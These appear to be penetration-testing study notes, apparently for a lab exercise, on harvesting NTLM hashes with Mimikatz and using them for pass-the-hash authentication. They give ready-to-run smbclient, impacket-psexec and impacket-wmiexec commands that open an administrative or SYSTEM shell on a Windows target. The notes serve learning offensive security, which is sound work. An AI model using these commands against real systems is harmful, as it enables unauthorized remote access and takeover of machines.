
If we get access to a user on a system, we can attempt to harvest the Administrator users NTLM hash using Mimikatz to conduct a pass the hash attack to gain root access to local and remote systems.

#### Pass-the-hash

We can use an NTLM hash to authenticate with local or remote targets with valid username and hash.

NTLM hashes are not salted and remain static between sessions.

If we discover an NTLM hash it can be used across multiple systems where the owner/user exists within the system.

The leverage this for code execution - the account needs to have administrative privileges.

If we are not using the local Administrator user we will need to bypass UAC remote restrictions if possible, even for users in the local administrators group.

`smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b` authenticate with smb service as Administrator using NTLM hash

`impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212` utilize hash with psexec to gain remote shell as Administrator - we can append a command to this example, but with it blank it will launch cmd.exe - We will get system user using this method, even if we authenticate with administrator

`impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212` - same as psexec except we get authenticated as the user we used to begin with
